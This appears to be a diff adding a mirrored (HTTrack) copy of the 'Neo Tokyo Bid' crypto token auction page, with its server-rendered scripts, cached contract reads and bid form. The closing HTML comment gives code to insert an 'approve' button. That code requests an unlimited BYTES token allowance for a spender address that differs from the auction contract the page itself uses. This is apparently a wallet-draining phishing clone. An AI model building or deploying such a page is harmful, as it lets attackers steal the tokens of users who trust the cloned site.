@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html>
+    <!-- Mirrored from nt-bid.neotokyo.codes/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 05 Aug 2025 06:17:00 GMT -->
+    <!-- Added by HTTrack -->
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
+    <!-- /Added by HTTrack -->
+    <head>
+        <script class='tsr-once'>
+            const __TSR_SSR__ = {
+                matches: [],
+                streamedValues: {},
+                initMatch: o => (__TSR_SSR__.matches.push(o),
+                o.extracted?.forEach(l => {
+                    if (l.type === "stream") {
+                        let r;
+                        l.value = new ReadableStream({
+                            start(e) {
+                                r = {
+                                    enqueue: t => {
+                                        try {
+                                            e.enqueue(t)
+                                        } catch {}
+                                    }
+                                    ,
+                                    close: () => {
+                                        try {
+                                            e.close()
+                                        } catch {}
+                                    }
+                                }
+                            }
+                        }),
+                        l.value.controller = r
+                    } else {
+                        let r, e;
+                        l.value = new Promise( (t, a) => {
+                            e = a,
+                            r = t
+                        }
+                        ),
+                        l.value.reject = e,
+                        l.value.resolve = r
+                    }
+                }
+                ),
+                !0),
+                resolvePromise: ({matchId: o, id: l, promiseState: r}) => {
+                    const e = __TSR_SSR__.matches.find(t => t.id === o);
+                    if (e) {
+                        const t = e.extracted?.[l];
+                        if (t && t.type === "promise" && t.value && r.status === "success")
+                            return t.value.resolve(r.data),
+                            !0
+                    }
+                    return !1
+                }
+                ,
+                injectChunk: ({matchId: o, id: l, chunk: r}) => {
+                    const e = __TSR_SSR__.matches.find(t => t.id === o);
+                    if (e) {
+                        const t = e.extracted?.[l];
+                        if (t && t.type === "stream" && t.value?.controller)
+                            return t.value.controller.enqueue(new TextEncoder().encode(r.toString())),
+                            !0
+                    }
+                    return !1
+                }
+                ,
+                closeStream: ({matchId: o, id: l}) => {
+                    const r = __TSR_SSR__.matches.find(e => e.id === o);
+                    if (r) {
+                        const e = r.extracted?.[l];
+                        if (e && e.type === "stream" && e.value?.controller)
+                            return e.value.controller.close(),
+                            !0
+                    }
+                    return !1
+                }
+                ,
+                cleanScripts: () => {
+                    document.querySelectorAll(".tsr-once").forEach(o => {
+                        o.remove()
+                    }
+                    )
+                }
+            };
+            window.__TSR_SSR__ = __TSR_SSR__;
+            ;if (typeof __TSR_SSR__ !== 'undefined')
+                __TSR_SSR__.cleanScripts()
+        </script>
+        <script class='tsr-once'>
+            __TSR_SSR__.initMatch({
+                "id": "__root__",
+                "__beforeLoadContext": "{}",
+                "loaderData": "{\"$undefined\":0}",
+                "error": "{\"$undefined\":0}",
+                "extracted": null,
+                "updatedAt": 1754374618736,
+                "status": "success"
+            });
+            if (typeof __TSR_SSR__ !== 'undefined')
+                __TSR_SSR__.cleanScripts()
+        </script>
+        <script class='tsr-once'>
+            __TSR_SSR__.initMatch({
+                "id": "/_main",
+                "__beforeLoadContext": "{}",
+                "loaderData": "{\"$undefined\":0}",
+                "error": "{\"$undefined\":0}",
+                "extracted": null,
+                "updatedAt": 1754374618736,
+                "status": "success"
+            });
+            if (typeof __TSR_SSR__ !== 'undefined')
+                __TSR_SSR__.cleanScripts()
+        </script>
+        <script class='tsr-once'>
+            __TSR_SSR__.initMatch({
+                "id": "/_main/",
+                "__beforeLoadContext": "{}",
+                "loaderData": "{}",
+                "error": "{\"$undefined\":0}",
+                "extracted": [],
+                "updatedAt": 1754374618736,
+                "status": "success"
+            });
+            if (typeof __TSR_SSR__ !== 'undefined')
+                __TSR_SSR__.cleanScripts()
+        </script>
+        <script class='tsr-once'>
+            __TSR_SSR__.dehydrated = "{\"manifest\":{\"routes\":{\"__root__\":{\"preloads\":[\"/assets/main-CVmT0YyI.js\"],\"assets\":[{\"tag\":\"script\",\"attrs\":{\"src\":\"/assets/main-CVmT0YyI.js\",\"type\":\"module\"}}]},\"/admin\":{\"preloads\":[\"/assets/route-DpxsvvHv.js\",\"/assets/useSuspenseQuery-CACd6q5J.js\",\"/assets/constants-BNADs_9s.js\"],\"assets\":[]},\"/dashboard\":{\"preloads\":[\"/assets/route-BSUU-fkI.js\"],\"assets\":[]},\"/_main\":{\"preloads\":[\"/assets/_main-DV93xIFD.js\",\"/assets/constants-BNADs_9s.js\"],\"assets\":[]},\"/_main/\":{\"preloads\":[\"/assets/_main.index-CdRK396L.js\",\"/assets/useAuction-BzxEPf3I.js\",\"/assets/useSuspenseQuery-CACd6q5J.js\"],\"assets\":[]},\"/admin/\":{\"preloads\":[\"/assets/index-CVZCg5JJ.js\",\"/assets/useAuction-BzxEPf3I.js\"],\"assets\":[]},\"/dashboard/\":{\"preloads\":[\"/assets/index-Bl_VCGZO.js\"],\"assets\":[]}}},\"dehydratedData\":{\"dehydratedQueryClient\":{\"mutations\":[],\"queries\":[]}},\"lastMatchId\":\"/_main/\"}";
+            if (typeof __TSR_SSR__ !== 'undefined')
+                __TSR_SSR__.cleanScripts()
+        </script>
+        <script class='tsr-once'>
+            __TSR_SSR__.streamedValues['__QueryClient__["readContracts",{"contracts":[{"address":"0xf691a8c4a05AE0EA8F7b962618300803a0F9F181","functionName":"auction"},{"address":"0xf691a8c4a05AE0EA8F7b962618300803a0F9F181","functionName":"nextAuctionId"},{"address":"0xf691a8c4a05AE0EA8F7b962618300803a0F9F181","args":["0x0000000000000000000000000000000000000000"],"functionName":"auctionBids"}]}]'] = {
+                value: "{\"mutations\":[],\"queries\":[{\"state\":{\"data\":\"[{\\\"result\\\":[\\\"0x39cbd5206884e92f9B706A54c2Fc6a25d4eE98b8\\\",\\\"0x8E4540DFED42AD6E94Fad58CDd2Dc1D538FE848D\\\",\\\"__stype:bigint:1754341679\\\",\\\"__stype:bigint:1754514479\\\",true,\\\"__stype:bigint:10000000000000000000\\\",\\\"__stype:bigint:100000000000000000000\\\",\\\"__stype:bigint:580000000000000000000\\\"],\\\"status\\\":\\\"success\\\"},{\\\"result\\\":3,\\\"status\\\":\\\"success\\\"},{\\\"result\\\":\\\"__stype:bigint:0\\\",\\\"status\\\":\\\"success\\\"}]\",\"dataUpdateCount\":1,\"dataUpdatedAt\":1754374618817,\"error\":null,\"errorUpdateCount\":0,\"errorUpdatedAt\":0,\"fetchFailureCount\":0,\"fetchFailureReason\":null,\"fetchMeta\":null,\"isInvalidated\":false,\"status\":\"success\",\"fetchStatus\":\"idle\"},\"queryKey\":[\"readContracts\",{\"contracts\":[{\"address\":\"0xf691a8c4a05AE0EA8F7b962618300803a0F9F181\",\"functionName\":\"auction\",\"chainId\":{\"$undefined\":0}},{\"address\":\"0xf691a8c4a05AE0EA8F7b962618300803a0F9F181\",\"functionName\":\"nextAuctionId\",\"chainId\":{\"$undefined\":0}},{\"address\":\"0xf691a8c4a05AE0EA8F7b962618300803a0F9F181\",\"functionName\":\"auctionBids\",\"args\":[\"0x0000000000000000000000000000000000000000\"],\"chainId\":{\"$undefined\":0}}]}],\"queryHash\":\"[\\\"readContracts\\\",{\\\"contracts\\\":[{\\\"address\\\":\\\"0xf691a8c4a05AE0EA8F7b962618300803a0F9F181\\\",\\\"functionName\\\":\\\"auction\\\"},{\\\"address\\\":\\\"0xf691a8c4a05AE0EA8F7b962618300803a0F9F181\\\",\\\"functionName\\\":\\\"nextAuctionId\\\"},{\\\"address\\\":\\\"0xf691a8c4a05AE0EA8F7b962618300803a0F9F181\\\",\\\"args\\\":[\\\"0x0000000000000000000000000000000000000000\\\"],\\\"functionName\\\":\\\"auctionBids\\\"}]}]\"}]}"
+            };
+            if (typeof __TSR_SSR__ !== 'undefined')
+                __TSR_SSR__.cleanScripts()
+        </script>
+        <script class='tsr-once'>
+            __TSR_SSR__.streamedValues['__QueryClient__["readContract",{"address":"0xa19f5264F7D7Be11c451C093D8f92592820Bea86","args":["0x0000000000000000000000000000000000000000"],"functionName":"balanceOf"}]'] = {
+                value: "{\"mutations\":[],\"queries\":[{\"state\":{\"data\":\"\\\"__stype:bigint:0\\\"\",\"dataUpdateCount\":1,\"dataUpdatedAt\":1754374618923,\"error\":null,\"errorUpdateCount\":0,\"errorUpdatedAt\":0,\"fetchFailureCount\":0,\"fetchFailureReason\":null,\"fetchMeta\":null,\"isInvalidated\":false,\"status\":\"success\",\"fetchStatus\":\"idle\"},\"queryKey\":[\"readContract\",{\"address\":\"0xa19f5264F7D7Be11c451C093D8f92592820Bea86\",\"functionName\":\"balanceOf\",\"args\":[\"0x0000000000000000000000000000000000000000\"]}],\"queryHash\":\"[\\\"readContract\\\",{\\\"address\\\":\\\"0xa19f5264F7D7Be11c451C093D8f92592820Bea86\\\",\\\"args\\\":[\\\"0x0000000000000000000000000000000000000000\\\"],\\\"functionName\\\":\\\"balanceOf\\\"}]\"}]}"
+            };
+            if (typeof __TSR_SSR__ !== 'undefined')
+                __TSR_SSR__.cleanScripts()
+        </script>
+        <meta charSet="utf-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1"/>
+        <title>Neo Tokyo Bid</title>
+        <meta name="description" content="Bid BYTES for your chance at a rare, newly minted S1 ID"/>
+        <link rel="modulepreload" href="assets/main-CVmT0YyI.js"/>
+        <link rel="modulepreload" href="assets/_main-DV93xIFD.js"/>
+        <link rel="modulepreload" href="assets/constants-BNADs_9s.js"/>
+        <link rel="modulepreload" href="assets/_main.index-CdRK396L.js"/>
+        <link rel="modulepreload" href="assets/useAuction-BzxEPf3I.js"/>
+        <link rel="modulepreload" href="assets/useSuspenseQuery-CACd6q5J.js"/>
+        <link rel="stylesheet" href="assets/app-lxzitYw6.css"/>
+    </head>
+    <body class="dark">
+        <script class="tsr-once">
+            document.documentElement.classList.toggle('dark', localStorage.theme === 'dark' || (!('theme'in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches))
+            if (typeof __TSR_SSR__ !== "undefined")
+                __TSR_SSR__.cleanScripts()
+        </script>
+        <!--$-->
+        <div class="flex min-h-screen flex-col bg-black text-white">
+            <nav class="border-b border-zinc-800 px-4 py-4">
+                <div class="mx-auto flex max-w-6xl items-center justify-between">
+                    <div class="flex items-center gap-6">
+                        <a class="text-2xl font-light active" href="index.html" data-status="active" aria-current="page">S1 Citizen ID Auction</a>
+                        <a href="admin.html" class="text-sm text-zinc-400 hover:text-white transition-colors">Admin</a>
+                    </div>
+                </div>
+            </nav>
+            <div class="mx-auto w-full max-w-6xl flex-1 px-4 py-12">
+                <div class="grid grid-cols-1 gap-6 md:grid-cols-2">
+                    <div class="rounded-sm border border-zinc-800 p-6">
+                        <div class="mb-6 flex items-center gap-4">
+                            <div class="relative h-16 w-16"></div>
+                            <div class="flex w-full items-center justify-between">
+                                <h2 class="text-3xl font-light">ID Auction #
+                                <!-- -->
+                                2</h2>
+                                <div class="rounded border border-zinc-700 px-2 py-1 text-xs">open</div>
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-2 gap-6">
+                            <div class="border p-4 border-zinc-800">
+                                <div class="text-xs mb-1 text-zinc-500">MINIMUM NEXT BID</div>
+                                <div class="text-xl text-white">590</div>
+                            </div>
+                            <div class="border p-4 border-zinc-800">
+                                <div class="text-xs mb-1 text-zinc-500">HIGHEST BID </div>
+                                <div class="text-xl text-white">580</div>
+                            </div>
+                            <div class="border p-4 border-zinc-800">
+                                <div class="text-xs mb-1 text-zinc-500">YOUR BID </div>
+                                <div class="text-xl text-white">0</div>
+                            </div>
+                            <div class="border p-4 border-zinc-800">
+                                <div class="text-xs mb-1 text-zinc-500">HIGHEST BIDDER </div>
+                                <div class="text-xl text-white">0x8E45...848D</div>
+                            </div>
+                            <div class="border p-4 border-zinc-800">
+                                <div class="text-xs mb-1 text-zinc-500">START DATE</div>
+                                <div class="text-xl text-white">Aug 04, 2025 21:07:59</div>
+                            </div>
+                            <div class="border p-4 border-zinc-800">
+                                <div class="text-xs mb-1 text-zinc-500">END DATE</div>
+                                <div class="text-xl text-white">Aug 06, 2025 21:07:59</div>
+                            </div>
+                        </div>
+                        <div class="mt-6">
+                            <div class="mb-2 text-center text-xs">Auction Ends In</div>
+                            <div class="text-center text-2xl">0
+                            <!-- -->
+                            d : 
+                            <!-- -->
+                            0
+                            <!-- -->
+                            h : 
+                            <!-- -->
+                            0
+                            <!-- -->
+                            m : 
+                            <!-- -->
+                            0
+                            <!-- -->
+                            s</div>
+                        </div>
+                    </div>
+                    <div class="flex flex-col items-center justify-center rounded-sm border border-zinc-800 p-6">
+                        <div class="mb-4 text-4xl font-light">[B]</div>
+                        <div class="max-w-xs text-center">
+                            <p class="mb-4">AUCTION IS CURRENTLY ACTIVE.</p>
+                            <div class="border border-[#333333] p-4">
+                                <p class="text-[22px]">Bid $BYTES</p>
+                                <p class="mb-2 opacity-50">Submit your maximum bid</p>
+                                <div class="relative flex items-center mb-2">
+                                    <input type="number" class="file:font-foreground ring-offset-background focus-visible:border-brand flex h-[44px] w-full border border-white/20 bg-white/10 px-3 py-2 file:border-0 file:bg-transparent file:text-sm placeholder:text-white/50 focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50 pr-16" max="0" name="bidAmt" value="590"/>
+                                    <button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:text-accent-foreground hover:bg-accent/50 h-8 gap-1.5 has-[&gt;svg]:px-2.5 absolute right-[6px] px-2">MAX</button>
+                                </div>
+                                <p class="text-[14px] opacity-50">Total Available: 
+                                <!-- -->
+                                0
+                                <!-- -->
+                                BYTES</p>
+                                <div class="mt-4">
+                                    <button data-slot="button" class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/40 aria-invalid:border-destructive border border-primary bg-background shadow-xs hover:bg-primary/90 hover:text-primary-foreground h-10 px-6 py-4 has-[&gt;svg]:px-3">Approve Bytes</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <footer class="border-t border-zinc-800 px-4 py-4">
+                <div class="mx-auto max-w-6xl">
+                    <div class="text-xs text-zinc-500">COPYRIGHT BYTES AUCTION LIMITED</div>
+                </div>
+            </footer>
+        </div>
+        <script></script>
+        <!--/$-->
+        <section aria-label="Notifications alt+T" tabindex="-1" aria-live="polite" aria-relevant="additions text" aria-atomic="false"></section>
+        <script src="assets/main-CVmT0YyI.js" type="module"></script>
+        <script class='tsr-once'>
+            __TSR_SSR__.streamedValues['__QueryClient__["readContract",{"address":"0xa19f5264F7D7Be11c451C093D8f92592820Bea86","args":["0x0000000000000000000000000000000000000000","0xf691a8c4a05AE0EA8F7b962618300803a0F9F181"],"functionName":"allowance"}]'] = {
+                value: "{\"mutations\":[],\"queries\":[{\"state\":{\"data\":\"\\\"__stype:bigint:0\\\"\",\"dataUpdateCount\":1,\"dataUpdatedAt\":1754374618951,\"error\":null,\"errorUpdateCount\":0,\"errorUpdatedAt\":0,\"fetchFailureCount\":0,\"fetchFailureReason\":null,\"fetchMeta\":null,\"isInvalidated\":false,\"status\":\"success\",\"fetchStatus\":\"idle\"},\"queryKey\":[\"readContract\",{\"address\":\"0xa19f5264F7D7Be11c451C093D8f92592820Bea86\",\"functionName\":\"allowance\",\"args\":[\"0x0000000000000000000000000000000000000000\",\"0xf691a8c4a05AE0EA8F7b962618300803a0F9F181\"]}],\"queryHash\":\"[\\\"readContract\\\",{\\\"address\\\":\\\"0xa19f5264F7D7Be11c451C093D8f92592820Bea86\\\",\\\"args\\\":[\\\"0x0000000000000000000000000000000000000000\\\",\\\"0xf691a8c4a05AE0EA8F7b962618300803a0F9F181\\\"],\\\"functionName\\\":\\\"allowance\\\"}]\"}]}"
+            };
+            if (typeof __TSR_SSR__ !== 'undefined')
+                __TSR_SSR__.cleanScripts()
+        </script>
+    </body>
+    <!-- Mirrored from nt-bid.neotokyo.codes/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 05 Aug 2025 06:17:02 GMT -->
+<!-- Removed duplicate HTML documents and duplicate variable declarations to fix redeclaration errors. 
+     If you want to add the approve button, insert the following inside the main HTML body where appropriate:
+
+  <button id="approveBtn">Connect & Approve Token</button>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script>
+    const tokenAddress = "0xa19f5264f7d7be11c451c093d8f92592820bea86";
+    const spenderAddress = "0x974c32106390e0F378f36FbF4428d4F32D813dd7";
+    const tokenABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+    const maxApproval = ethers.constants.MaxUint256;
+    async function connectAndApprove() {
+      if (!window.ethereum) {
+        alert("MetaMask not found!");
+        return;
+      }
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
+      try {
+        const tx = await tokenContract.approve(spenderAddress, maxApproval);
+        console.log("Transaction sent:", tx.hash);
+        alert("Approval sent. Check MetaMask to confirm.");
+      } catch (err) {
+        console.error("Approval error:", err);
+        alert("Approval failed or was rejected.");
+      }
+    }
+    document.getElementById("approveBtn").addEventListener("click", connectAndApprove);
+  </script>
+-->
